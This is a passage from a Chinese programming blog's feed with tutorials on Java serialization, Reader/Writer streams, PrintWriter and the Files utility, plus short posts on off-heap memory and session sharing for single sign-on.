class="headerlink" title="反序列化"></a>反序列化</h3><p>和<code>ObjectOutputStream</code>相反，<code>ObjectInputStream</code>负责从一个字节流读取Java对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try (ObjectInputStream input &#x3D; new ObjectInputStream(...)) &#123;</span><br><span class="line">    int n &#x3D; input.readInt();</span><br><span class="line">    String s &#x3D; input.readUTF();</span><br><span class="line">    Double d &#x3D; (Double) input.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了能读取基本类型和<code>String</code>类型外，调用<code>readObject()</code>可以直接返回一个<code>Object</code>对象。要把它变成一个特定类型，必须强制转型。</p><p><code>readObject()</code>可能抛出的异常有：</p><ul><li><code>ClassNotFoundException</code>：没有找到对应的Class；</li><li><code>InvalidClassException</code>：Class不匹配。</li></ul><p>对于<code>ClassNotFoundException</code>，这种情况常见于一台电脑上的Java程序把一个Java对象，例如，<code>Person</code>对象序列化以后，通过网络传给另一台电脑上的另一个Java程序，但是这台电脑的Java程序并没有定义<code>Person</code>类，所以无法反序列化。</p><p>对于<code>InvalidClassException</code>，这种情况常见于序列化的<code>Person</code>对象定义了一个<code>int</code>类型的<code>age</code>字段，但是反序列化时，<code>Person</code>类定义的<code>age</code>字段被改成了<code>long</code>类型，所以导致class不兼容。</p><p>为了避免这种class定义变动导致的不兼容，Java的序列化允许class定义一个特殊的<code>serialVersionUID</code>静态变量，用于标识Java类的序列化“版本”，通常可以由IDE自动生成。如果增加或修改了字段，可以改变<code>serialVersionUID</code>的值，这样就能自动阻止不匹配的class版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID &#x3D; 2709425275741743919L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要特别注意反序列化的几个重要特点：</p><p>反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>因为Java的序列化机制可以导致一个实例能直接从<code>byte[]</code>数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的<code>byte[]</code>数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。</p><p>实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。</p><h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>可序列化的Java对象必须实现<code>java.io.Serializable</code>接口，类似<code>Serializable</code>这样的空接口被称为“标记接口”（Marker Interface）；</p><p>反序列化时不调用构造方法，可设置<code>serialVersionUID</code>作为版本号（非必需）；</p><p>Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。</p><h1 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h1><p><code>Reader</code>是Java的IO库提供的另一个输入流接口。和<code>InputStream</code>的区别是，<code>InputStream</code>是一个字节流，即以<code>byte</code>为单位读取，而<code>Reader</code>是一个字符流，即以<code>char</code>为单位读取：</p><div class="table-container"><table><thead><tr><th style="text-align:left">InputStream</th><th style="text-align:left">Reader</th></tr></thead><tbody><tr><td style="text-align:left">字节流，以<code>byte</code>为单位</td><td style="text-align:left">字符流，以<code>char</code>为单位</td></tr><tr><td style="text-align:left">读取字节（-1，0~255）：<code>int read()</code></td><td style="text-align:left">读取字符（-1，0~65535）：<code>int read()</code></td></tr><tr><td style="text-align:left">读到字节数组：<code>int read(byte[] b)</code></td><td style="text-align:left">读到字符数组：<code>int read(char[] c)</code></td></tr></tbody></table></div><p><code>java.io.Reader</code>是所有字符输入流的超类，它最主要的方法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public int read() throws IOException;</span><br></pre></td></tr></table></figure><p>这个方法读取字符流的下一个字符，并返回字符表示的<code>int</code>，范围是<code>0</code>~<code>65535</code>。如果已读到末尾，返回<code>-1</code>。</p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><p><code>FileReader</code>是<code>Reader</code>的一个子类，它可以打开文件并获取<code>Reader</code>。下面的代码演示了如何完整地读取一个<code>FileReader</code>的所有字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void readFile() throws IOException &#123;</span><br><span class="line">    &#x2F;&#x2F; 创建一个FileReader对象:</span><br><span class="line">    Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;); &#x2F;&#x2F; 字符编码是???</span><br><span class="line">    for (;;) &#123;</span><br><span class="line">        int n &#x3D; reader.read(); &#x2F;&#x2F; 反复调用read()方法，直到返回-1</span><br><span class="line">        if (n &#x3D;&#x3D; -1) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println((char)n); &#x2F;&#x2F; 打印char</span><br><span class="line">    &#125;</span><br><span class="line">    reader.close(); &#x2F;&#x2F; 关闭流</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们读取一个纯ASCII编码的文本文件，上述代码工作是没有问题的。但如果文件中包含中文，就会出现乱码，因为<code>FileReader</code>默认的编码与系统相关，例如，Windows系统的默认编码可能是<code>GBK</code>，打开一个<code>UTF-8</code>编码的文本文件就会出现乱码。</p><p>要避免乱码问题，我们需要在创建<code>FileReader</code>时指定编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8);</span><br></pre></td></tr></table></figure><p>和<code>InputStream</code>类似，<code>Reader</code>也是一种资源，需要保证出错的时候也能正确关闭，所以我们需要用<code>try (resource)</code>来保证<code>Reader</code>在无论有没有IO错误的时候都能够正确地关闭：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8) &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Reader</code>还提供了一次性读取若干字符并填充到<code>char[]</code>数组的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public int read(char[] c) throws IOException</span><br></pre></td></tr></table></figure><p>它返回实际读入的字符个数，最大不超过<code>char[]</code>数组的长度。返回<code>-1</code>表示流结束。</p><p>利用这个方法，我们可以先设置一个缓冲区，然后，每次尽可能地填充缓冲区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public void readFile() throws IOException &#123;</span><br><span class="line">    try (Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        char[] buffer &#x3D; new char[1000];</span><br><span class="line">        int n;</span><br><span class="line">        while ((n &#x3D; reader.read(buffer)) !&#x3D; -1) &#123;</span><br><span class="line">            System.out.println(&quot;read &quot; + n + &quot; chars.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CharArrayReader"><a href="#CharArrayReader" class="headerlink" title="CharArrayReader"></a>CharArrayReader</h3><p><code>CharArrayReader</code>可以在内存中模拟一个<code>Reader</code>，它的作用实际上是把一个<code>char[]</code>数组变成一个<code>Reader</code>，这和<code>ByteArrayInputStream</code>非常类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try (Reader reader &#x3D; new CharArrayReader(&quot;Hello&quot;.toCharArray())) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="StringReader"><a href="#StringReader" class="headerlink" title="StringReader"></a>StringReader</h3><p><code>StringReader</code>可以直接把<code>String</code>作为数据源，它和<code>CharArrayReader</code>几乎一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try (Reader reader &#x3D; new StringReader(&quot;Hello&quot;)) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="InputStreamReader"><a href="#InputStreamReader" class="headerlink" title="InputStreamReader"></a>InputStreamReader</h3><p><code>Reader</code>和<code>InputStream</code>有什么关系？</p><p>除了特殊的<code>CharArrayReader</code>和<code>StringReader</code>，普通的<code>Reader</code>实际上是基于<code>InputStream</code>构造的，因为<code>Reader</code>需要从<code>InputStream</code>中读入字节流（<code>byte</code>），然后，根据编码设置，再转换为<code>char</code>就可以实现字符流。如果我们查看<code>FileReader</code>的源码，它在内部实际上持有一个<code>FileInputStream</code>。</p><p>既然<code>Reader</code>本质上是一个基于<code>InputStream</code>的<code>byte</code>到<code>char</code>的转换器，那么，如果我们已经有一个<code>InputStream</code>，想把它转换为<code>Reader</code>，是完全可行的。<code>InputStreamReader</code>就是这样一个转换器，它可以把任何<code>InputStream</code>转换为<code>Reader</code>。示例代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 持有InputStream:</span><br><span class="line">InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;);</span><br><span class="line">&#x2F;&#x2F; 变换为Reader:</span><br><span class="line">Reader reader &#x3D; new InputStreamReader(input, &quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure><p>构造<code>InputStreamReader</code>时，我们需要传入<code>InputStream</code>，还需要指定编码，就可以得到一个<code>Reader</code>对象。上述代码可以通过<code>try (resource)</code>更简洁地改写如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (Reader reader &#x3D; new InputStreamReader(new FileInputStream(&quot;src&#x2F;readme.txt&quot;), &quot;UTF-8&quot;)) &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码实际上就是<code>FileReader</code>的一种实现方式。</p><p>使用<code>try (resource)</code>结构时，当我们关闭<code>Reader</code>时，它会在内部自动调用<code>InputStream</code>的<code>close()</code>方法，所以，只需要关闭最外层的<code>Reader</code>对象即可。</p><p>:heavy_exclamation_mark:使用InputStreamReader，可以把一个InputStream转换成一个Reader。</p><h3 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h3><p><code>Reader</code>定义了所有字符输入流的超类：</p><ul><li><code>FileReader</code>实现了文件字符流输入，使用时需要指定编码；</li><li><code>CharArrayReader</code>和<code>StringReader</code>可以在内存中模拟一个字符流输入。</li></ul><p><code>Reader</code>是基于<code>InputStream</code>构造的：可以通过<code>InputStreamReader</code>在指定编码的同时将任何<code>InputStream</code>转换为<code>Reader</code>。</p><p>总是使用<code>try (resource)</code>保证<code>Reader</code>正确关闭。</p><h1 id="Writer"><a href="#Writer" class="headerlink" title="Writer"></a>Writer</h1><p><code>Reader</code>是带编码转换器的<code>InputStream</code>，它把<code>byte</code>转换为<code>char</code>，而<code>Writer</code>就是带编码转换器的<code>OutputStream</code>，它把<code>char</code>转换为<code>byte</code>并输出。</p><p><code>Writer</code>和<code>OutputStream</code>的区别如下：</p><div class="table-container"><table><thead><tr><th style="text-align:left">OutputStream</th><th style="text-align:left">Writer</th></tr></thead><tbody><tr><td style="text-align:left">字节流，以<code>byte</code>为单位</td><td style="text-align:left">字符流，以<code>char</code>为单位</td></tr><tr><td style="text-align:left">写入字节（0~255）：<code>void write(int b)</code></td><td style="text-align:left">写入字符（0~65535）：<code>void write(int c)</code></td></tr><tr><td style="text-align:left">写入字节数组：<code>void write(byte[] b)</code></td><td style="text-align:left">写入字符数组：<code>void write(char[] c)</code></td></tr><tr><td style="text-align:left">无对应方法</td><td style="text-align:left">写入String：<code>void write(String s)</code></td></tr></tbody></table></div><p><code>Writer</code>是所有字符输出流的超类，它提供的方法主要有：</p><ul><li>写入一个字符（0~65535）：<code>void write(int c)</code>；</li><li>写入字符数组的所有字符：<code>void write(char[] c)</code>；</li><li>写入String表示的所有字符：<code>void write(String s)</code>。</li></ul><h3 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h3><p><code>FileWriter</code>就是向文件中写入字符流的<code>Writer</code>。它的使用方法和<code>FileReader</code>类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try (Writer writer &#x3D; new FileWriter(&quot;readme.txt&quot;, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">    writer.write(&#39;H&#39;); &#x2F;&#x2F; 写入单个字符</span><br><span class="line">    writer.write(&quot;Hello&quot;.toCharArray()); &#x2F;&#x2F; 写入char[]</span><br><span class="line">    writer.write(&quot;Hello&quot;); &#x2F;&#x2F; 写入String</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CharArrayWriter"><a href="#CharArrayWriter" class="headerlink" title="CharArrayWriter"></a>CharArrayWriter</h3><p><code>CharArrayWriter</code>可以在内存中创建一个<code>Writer</code>，它的作用实际上是构造一个缓冲区，可以写入<code>char</code>，最后得到写入的<code>char[]</code>数组，这和<code>ByteArrayOutputStream</code>非常类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try (CharArrayWriter writer &#x3D; new CharArrayWriter()) &#123;</span><br><span class="line">    writer.write(65);</span><br><span class="line">    writer.write(66);</span><br><span class="line">    writer.write(67);</span><br><span class="line">    char[] data &#x3D; writer.toCharArray(); &#x2F;&#x2F; &#123; &#39;A&#39;, &#39;B&#39;, &#39;C&#39; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="StringWriter"><a href="#StringWriter" class="headerlink" title="StringWriter"></a>StringWriter</h3><p><code>StringWriter</code>也是一个基于内存的<code>Writer</code>，它和<code>CharArrayWriter</code>类似。实际上，<code>StringWriter</code>在内部维护了一个<code>StringBuffer</code>，并对外提供了<code>Writer</code>接口。</p><h3 id="OutputStreamWriter"><a href="#OutputStreamWriter" class="headerlink" title="OutputStreamWriter"></a>OutputStreamWriter</h3><p>除了<code>CharArrayWriter</code>和<code>StringWriter</code>外，普通的Writer实际上是基于<code>OutputStream</code>构造的，它接收<code>char</code>，然后在内部自动转换成一个或多个<code>byte</code>，并写入<code>OutputStream</code>。因此，<code>OutputStreamWriter</code>就是一个将任意的<code>OutputStream</code>转换为<code>Writer</code>的转换器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (Writer writer &#x3D; new OutputStreamWriter(new FileOutputStream(&quot;readme.txt&quot;), &quot;UTF-8&quot;)) &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码实际上就是<code>FileWriter</code>的一种实现方式。这和上一节的<code>InputStreamReader</code>是一样的。</p><h3 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h3><p><code>Writer</code>定义了所有字符输出流的超类：</p><ul><li><code>FileWriter</code>实现了文件字符流输出；</li><li><code>CharArrayWriter</code>和<code>StringWriter</code>在内存中模拟一个字符流输出。</li></ul><p>使用<code>try (resource)</code>保证<code>Writer</code>正确关闭。</p><p><code>Writer</code>是基于<code>OutputStream</code>构造的，可以通过<code>OutputStreamWriter</code>将<code>OutputStream</code>转换为<code>Writer</code>，转换时需要指定编码。</p><h1 id="PrintStream和PrintWriter"><a href="#PrintStream和PrintWriter" class="headerlink" title="PrintStream和PrintWriter"></a>PrintStream和PrintWriter</h1><p><code>PrintStream</code>是一种<code>FilterOutputStream</code>，它在<code>OutputStream</code>的接口上，额外提供了一些写入各种数据类型的方法：</p><ul><li>写入<code>int</code>：<code>print(int)</code></li><li>写入<code>boolean</code>：<code>print(boolean)</code></li><li>写入<code>String</code>：<code>print(String)</code></li><li>写入<code>Object</code>：<code>print(Object)</code>，实际上相当于<code>print(object.toString())</code></li><li>…</li></ul><p>以及对应的一组<code>println()</code>方法，它会自动加上换行符。</p><p>我们经常使用的<code>System.out.println()</code>实际上就是使用<code>PrintStream</code>打印各种数据。其中，<code>System.out</code>是系统默认提供的<code>PrintStream</code>，表示标准输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(12345); &#x2F;&#x2F; 输出12345</span><br><span class="line">System.out.print(new Object()); &#x2F;&#x2F; 输出类似java.lang.Object@3c7a835a</span><br><span class="line">System.out.println(&quot;Hello&quot;); &#x2F;&#x2F; 输出Hello并换行</span><br></pre></td></tr></table></figure><p><code>System.err</code>是系统默认提供的标准错误输出。</p><p><code>PrintStream</code>和<code>OutputStream</code>相比，除了添加了一组<code>print()</code>/<code>println()</code>方法，可以打印各种数据类型，比较方便外，它还有一个额外的优点，就是不会抛出<code>IOException</code>，这样我们在编写代码的时候，就不必捕获<code>IOException</code>。</p><h3 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h3><p><code>PrintStream</code>最终输出的总是byte数据，而<code>PrintWriter</code>则是扩展了<code>Writer</code>接口，它的<code>print()</code>/<code>println()</code>方法最终输出的是<code>char</code>数据。两者的使用方法几乎是一模一样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>     </span>&#123;</span><br><span class="line">        StringWriter buffer = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="keyword">try</span> (PrintWriter pw = <span class="keyword">new</span> PrintWriter(buffer)) &#123;</span><br><span class="line">            pw.println(<span class="string">"Hello"</span>);</span><br><span class="line">            pw.println(<span class="number">12345</span>);</span><br><span class="line">            pw.println(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h3><p><code>PrintStream</code>是一种能接收各种数据类型的输出，打印数据时比较方便：</p><ul><li><code>System.out</code>是标准输出；</li><li><code>System.err</code>是标准错误输出。</li></ul><p><code>PrintWriter</code>是基于<code>Writer</code>的输出。</p><h1 id="使用Files"><a href="#使用Files" class="headerlink" title="使用Files"></a>使用Files</h1><p>从Java 7开始，提供了<code>Files</code>和<code>Paths</code>这两个工具类，能极大地方便我们读写文件。</p><p>虽然<code>Files</code>和<code>Paths</code>是<code>java.nio</code>包里面的类，但他俩封装了很多读写文件的简单方法，例如，我们要把一个文件的全部内容读取为一个<code>byte[]</code>，可以这么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] data = Files.readAllBytes(Paths.get(<span class="string">"/path/to/file.txt"</span>));</span><br></pre></td></tr></table></figure><p>如果是文本文件，可以把一个文件的全部内容读取为<code>String</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认使用UTF-8编码读取:</span></span><br><span class="line">String content1 = Files.readString(Paths.get(<span class="string">"/path/to/file.txt"</span>));</span><br><span class="line"><span class="comment">// 可指定编码:</span></span><br><span class="line">String content2 = Files.readString(Paths.get(<span class="string">"/path/to/file.txt"</span>), StandardCharsets.ISO_8859_1);</span><br><span class="line"><span class="comment">// 按行读取并返回每行内容:</span></span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(Paths.get(<span class="string">"/path/to/file.txt"</span>));</span><br></pre></td></tr></table></figure><p>写入文件也非常方便：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入二进制文件:</span></span><br><span class="line"><span class="keyword">byte</span>[] data = ...</span><br><span class="line">Files.write(Paths.get(<span class="string">"/path/to/file.txt"</span>), data);</span><br><span class="line"><span class="comment">// 写入文本并指定编码:</span></span><br><span class="line">Files.writeString(Paths.get(<span class="string">"/path/to/file.txt"</span>), <span class="string">"文本内容..."</span>, StandardCharsets.ISO_8859_1);</span><br><span class="line"><span class="comment">// 按行写入文本:</span></span><br><span class="line">List&lt;String&gt; lines = ...</span><br><span class="line">Files.write(Paths.get(<span class="string">"/path/to/file.txt"</span>), lines);</span><br></pre></td></tr></table></figure><p>此外，<code>Files</code>工具类还有<code>copy()</code>、<code>delete()</code>、<code>exists()</code>、<code>move()</code>等快捷方法操作文件和目录。</p><p>最后需要特别注意的是，<code>Files</code>提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容。</p><h3 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h3><p>对于简单的小文件读写操作，可以使用<code>Files</code>工具类简化代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;File对象&quot;&gt;&lt;a href=&quot;#File对象&quot; class=&quot;headerlink&quot; title=&quot;File对象&quot;&gt;&lt;/a&gt;File对象&lt;/h1&gt;&lt;p&gt;在计算机系统中，文件是非常重要的存储方式。Java的标准库&lt;code&gt;java.io&lt;/code&gt;提供了&lt;c
      
    
    </summary>
    
    
    
      <category term="io" scheme="https://kayleh.top/tags/io/"/>
    
  </entry>
  
  <entry>
    <title>off-heap</title>
    <link href="https://kayleh.top/off-heap/"/>
    <id>https://kayleh.top/off-heap/</id>
    <published>2020-12-20T13:21:38.000Z</published>
    <updated>2021-01-17T13:20:01.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆外内存"><a href="#堆外内存" class="headerlink" title="堆外内存"></a>堆外内存</h1><p>off-heap叫做堆外内存，将你的对象从堆中脱离出来序列化，然后存储在一大块内存中，这就像它存储到磁盘上一样，但它仍然在RAM中。对象在这种状态下不能直接使用，它们必须首先反序列化，也不受垃圾收集。序列化和反序列化将会影响部分性能（所以可以考虑使用FST-serialization）使用堆外内存能够降低GC导致的暂停。堆外内存不受垃圾收集器管理，也不属于老年代，新生代。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆外内存&quot;&gt;&lt;a href=&quot;#堆外内存&quot; class=&quot;headerlink&quot; title=&quot;堆外内存&quot;&gt;&lt;/a&gt;堆外内存&lt;/h1&gt;&lt;p&gt;off-heap叫做堆外内存，将你的对象从堆中脱离出来序列化，然后存储在一大块内存中，这就像它存储到磁盘上一样，但它仍然在R
      
    
    </summary>
    
    
    
      <category term="jvm" scheme="https://kayleh.top/tags/jvm/"/>
    
  </entry>
  
  <entry>
    <title>Single point login</title>
    <link href="https://kayleh.top/single-point-login/"/>
    <id>https://kayleh.top/single-point-login/</id>
    <published>2020-12-17T06:58:05.000Z</published>
    <updated>2021-01-17T13:19:47.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="单点登录实现"><a href="#单点登录实现" class="headerlink" title="单点登录实现"></a>单点登录实现</h1><h3 id="分布式Session即Session共享"><a href="#分布式Session即Session共享" class="headerlink" title="分布式Session即Session共享"></a>分布式Session即Session共享</h3><p>如果我们是同一个网站，在多台服务器上部署，并且访问同一个域名，这种类似于分布式session，目前比较简单的解决方案用nginx做代理就可以实现。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn2/单点登录实现/20180517164650663.png" alt="è¿éåå¾çæè¿°"></p><p>在单服务器web应用中，登录用户信息只需存在该服务的session中，这是我们几年前最长见的办法。而在当今分布式系统的流行中，微服务已成为主流，用户登录由某一个单点服务完成并存储session后，在高并发量的请求（需要验证登录信息）到达服务端的时候通过负载均衡的方式分发到集群中的某个服务器，这样就有可能导致同一个用户的多次请求被分发到集群的不同服务器上，就会出现取不到session数据的情况，于是session的共享就成了一个问题。目前实现session共享的解决方案：</p><p>1）Session复制与共享 多个server之间相互同步session，这样每个server上都包含全部Service的session。</p><p>优点：tomcat等多数主流web服务器都支持此功能。</p><p>不足：session同步需要数据传输，占内网带宽，有时延。所有服务器都包含所有session数据，特别是当session中保存了较大的对象，而且对象变化较快时，性能下降显著，这种特性使得web应用的水平扩展受到了限制。</p><p>2）客户端存储法 服务端存储所有用户的session，内存占用较大，也可以将session存储到浏览器cookie中，每个端只要存储一个用户的数据了。</p><p>优点：服务端不需要存储</p><p>缺点：每次http请求都携带session，占外网带宽数据存储在端上，并在网络传输，存在泄漏、篡改、窃取等安全隐患。session存储的数据大小受cookie限制。</p><p>3）反向代理hash一致性  为了保证高可用，有多台冗余，反向代理层能不能做一些事情，让同一个用户的请求保证落在一台web服务器上呢？具体方案：反向代理使用IP或http协议中的某些业务参数来做hash，以保证同一个浏览器用户的请求落在同一个web服务器上。</p><p>优点：只需要改nginx配置，不用改应用代码，负载均衡，只要hash属性是均匀的，多台web服务器的负载是均衡的。可以支持web服务器水平扩展（session同步法是不行的，受内存限制）</p><p>缺点：如果web服务器重启，一部分session会丢失，产生业务影响，例如部分用户重新登录。如果web服务器水平扩展，rehash后session重新分布，也会有一部分用户路由不到正确的session。</p><p>4）服务端集中存储 将session存储在后端的存储层，如：数据库或者缓存。客户端每发次一次请求，都会先从存储中获取，再处理具体的业务逻辑。</p><p>优点：无安全隐患，可以水平扩，服务器重启或者扩容都不会造成session丢失。</p><p>不足：增加了一次网络调用，要修改应用代码。</p><p>总结：一般对单点登录和session共享的处理，大都选择在服务端集中存储来实现。对于db存储还是cache，肯定cache是首选。因为session读取的频率会很高，使用数据库压力会比较大。如果有session高可用需求，cache可以做高可用，但大部分情况下session可以丢失，一般也不需要考虑高可用。目前主流的现实方案是用redis实现session的存储。</p><h3 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h3><p>如果是不同网站，我们要做到登陆A系统，同时从A系统跳转到B系统并且B系统不用登陆，B系统登录后也可以跳转到A系统并且A系统也不需要登陆，系统可以扩展到N个，这种是单点登录，并且涉及到跨域的处理，这种解决方案目前看来有Oauth2.0，JWT 等单点登录（SSO）框架，并且最好每个系统都集成单点登录才是比较好的，或者做一个认证中心，实现登陆认证中心后可以跳转到A,B系统，这时候A,B系统即可以做单点登录也可以不再做单点登陆</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn2/单点登录实现/20180302091422572.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;单点登录实现&quot;&gt;&lt;a href=&quot;#单点登录实现&quot; class=&quot;headerlink&quot; title=&quot;单点登录实现&quot;&gt;&lt;/a&gt;单点登录实现&lt;/h1&gt;&lt;h3 id=&quot;分布式Session即Session共享&quot;&gt;&lt;a href=&quot;#分布式Session即Sessio
      
    
    </summary>
    
    
    
      <category term="DistributedMicroservices" scheme="https://kayleh.top/tags/DistributedMicroservices/"/>
    
  </entry>
  
  <entry>
    <title>JMM memory model</title>
    <link href="https://kayleh.top/jmm-memory-model/"/>
    <id>https://kayleh.top/jmm-memory-model/</id>
    <published>2020-12-16T18:40:45.000Z</published>
    <updated>2021-01-17T13:20:35.436Z</updated>
    
